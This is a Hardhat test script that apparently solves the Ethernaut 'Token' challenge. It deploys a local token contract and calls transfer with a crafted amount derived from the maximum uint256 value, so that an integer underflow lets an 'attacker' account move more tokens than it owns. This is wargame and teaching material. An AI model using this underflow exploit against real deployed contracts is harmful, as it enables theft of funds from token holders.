import { ethers } from "hardhat";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { BigNumber } from "ethers";

// From TokenFactory contract
const SUPPLY = 21000000;
const PLAYER_SUPPLY = 20;
const UINT_MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

describe("Hack Token contract", () => {
  async function deployTokenFixture() {
    const [deployer, attacker, attacker_2] = await ethers.getSigners();
    const Token = await ethers.getContractFactory("Token");
    const token = await Token.connect(deployer).deploy(SUPPLY);

    // You are given 20 tokens to start on Ethernaut. To simulate this, transfer 20 tokens from deployer to attacker
    token.connect(deployer).transfer(attacker.address, PLAYER_SUPPLY);

    return { attacker, attacker_2, token };
  }

  it("Should get more tokens than specified", async () => {
    const { attacker, attacker_2, token } = await loadFixture(deployTokenFixture);

    const tx = await token
      .connect(attacker)
      .transfer(
        attacker_2.address,
        BigNumber.from(UINT_MAX).sub("115792089237316195423570985008687907853269984665640564039457584007913129639135")
      );
    tx.wait();

    const balanceAfter = await token.balanceOf(attacker_2.address);
    console.log(" Attacker_2 ------------------------------------------------------------- ", balanceAfter.toString());
  });
});
